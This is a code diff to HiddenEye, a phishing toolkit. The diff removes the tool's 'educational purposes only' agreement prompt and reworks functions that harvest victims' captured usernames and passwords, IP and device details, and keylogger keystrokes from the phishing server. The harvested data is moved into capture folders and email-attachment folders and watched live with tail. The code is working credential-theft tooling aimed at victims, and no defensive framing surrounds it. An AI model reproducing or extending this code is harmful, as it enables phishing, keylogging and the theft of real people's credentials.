@@ -188,6 +188,7 @@ def selectPort():  # Question where user must select port
 
 
 def selectServer(port):  # Question where user must select server
+    startmonitor()
     system('clear')
     print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -557,21 +558,6 @@ def runLT(port, npm):
         print('{0}error[invalid/preoccupied]{0}'.format(MAIN0))
         runLT(port, npm)
 
-
-def runMainMenu():  # menu where user select what they wanna use
-    # Terms Of Service
-    sleep(6)
-    system('clear')
-    orange  = '\033[33m'
-    blue  = '\033[34m'
-    purple  = '\033[35m'
-    red  = '\033[31m'
-    print("\n\n\n              {2}WITH GREAT {1}POWER {3}- {2}COMES GREAT {1}RESPONSIBILITY      ".format(orange, red, purple, blue))
-    
-    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y':
-        system('clear')
-        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
-        exit()
 
 
 def mainMenu():
@@ -1014,9 +1000,6 @@ def addkeylogger():
         sleep(2)
 
 
-def runServer(port):
-    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
 
 
 def emailPrompt3(port):  # Ask user to start sending credentials to recipient Email Address.
@@ -1071,39 +1054,29 @@ def endMessage(port):  # Message when HiddenEye exit
 def returnServer(port):
 	selectServer(port)
 
+
+
+
 def getCredentials(port):
+    system("fuser -k Server/www/usernames.txt > /dev/null 2>&1")
+    system("fuser -k Server/www/ip.txt > /dev/null 2>&1")
+    system("""cat Server/www/usernames.txt > Server/CapturedData/usernames.txt && 
+            cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt &&
+            rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt""")
+    system("""cat Server/www/ip.txt > Server/CapturedData/ip.txt && 
+            cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && 
+            rm -rf Server/www/ip.txt && touch Server/www/ip.txt""")
+    system("""touch Server/CapturedData/KeyloggerData.txt && 
+            cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && 
+             cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt &&
+             rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt""")
 
-    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(MAIN0, MAIN2, MAIN4))
-    while True:
-        with open('Server/www/usernames.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                writeLog('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(
-                    MAIN2, MAIN3, lines))
-                system("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")
+def startmonitor():
+
+    system("tail -f Server/www/usernames.txt&")
+    system("tail -f Server/www/ip.txt&")
 
 
-        with open('Server/www/ip.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                writeLog('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(
-                    MAIN2, MAIN3, lines))
-                system('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-
-        creds.close()
-
-        with open('Server/www/KeyloggerData.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                writeLog(
-                    '{0}...............................'.format(MAIN0, MAIN4))
-                writeLog(
-                    ' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(MAIN3, MAIN2, lines))
-                system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
-                writeLog(
-                    '{0}...............................'.format(MAIN0, MAIN4))
-
-        creds.close()
 
 
 def writeLog(ctx):  # Writing log
